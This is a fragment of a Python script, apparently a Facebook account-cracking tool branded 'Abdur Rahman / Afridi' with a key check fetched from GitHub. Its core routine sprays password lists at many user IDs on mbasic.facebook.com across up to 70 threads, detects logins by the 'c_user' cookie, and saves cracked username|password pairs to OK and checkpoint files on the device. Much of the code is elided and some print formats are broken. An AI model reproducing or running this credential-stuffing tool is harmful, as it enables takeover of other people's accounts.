...
def main_apv():
    ...
    r1=requests.get("https://github.com/Afridi125/blob/main/z.txt").text
    ...
    if key1 in r1:
        ...
        os.system('am start https://wa.me/+923******?text=' + tks)
...
........:::..:::::..::........:::.......::::......:::..:::::..:::::
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    ...
    Facebook : facebook.com/Abdurrahman
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/Afridi-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/Afridi-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1m [!] Tool    : Abdur Rahman")

			print (" [!] Brand   : Abdurrahman")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[AbdurRahman\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Abdur Rahman-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/AbdurRahman_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/AbdurRahman_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with abdurrahman(max_workers=70) as afridiworld:
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    ...
                    try:
                        ...
                        afridiworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
            ...
            with abdurrahman(max_workers=30) as afridiworld:
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/6")
